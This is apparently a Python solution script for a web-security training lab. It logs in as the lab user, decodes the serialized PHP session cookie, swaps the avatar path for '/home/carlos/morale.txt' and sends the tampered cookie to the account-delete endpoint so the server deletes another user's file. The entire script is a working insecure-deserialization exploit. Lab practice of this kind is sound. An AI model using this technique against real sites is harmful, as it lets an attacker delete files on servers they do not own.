import requests
from urllib.parse import unquote
import base64

url = "https://0a61000903ea89fd806680f30037004a.web-security-academy.net/"

session = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": f"{url}/login",
    "Origin": f"{url}"
}

cookies = {
    "session": ""
}

data = {
    "username": "wiener",
    "password": "peter"
}

response = session.post(
    f"{url}/login",
    headers=headers,
    cookies=cookies,
    data=data,
)

if "/my-account?id=wiener" in response.text:
    print("Logged in successful!")
else:
    print("Cannot Logged in!")

normalDecodedSessionToken = base64.b64decode(unquote(session.cookies.get("session"))).decode()
print(f"Normal cookie is: {normalDecodedSessionToken}")

changedDecodedSessionToken = normalDecodedSessionToken.replace('s:19:"users/wiener/avatar"', 's:23:"/home/carlos/morale.txt"')
changedSessionToken = base64.b64encode(changedDecodedSessionToken.encode()).decode()
print(f"Changed cookie is: {changedSessionToken}")


session.cookies.set(
    "session",
    changedSessionToken,
    domain="0a61000903ea89fd806680f30037004a.web-security-academy.net",
)

deleteAccountRequest = session.post(
    f"{url}/my-account/delete",
    headers=headers
)

if "Congratulations, you solved the lab!" in deleteAccountRequest.text:
    print("You successfully deleted the Carlos user!")
else:
    print("Deleting process failed!")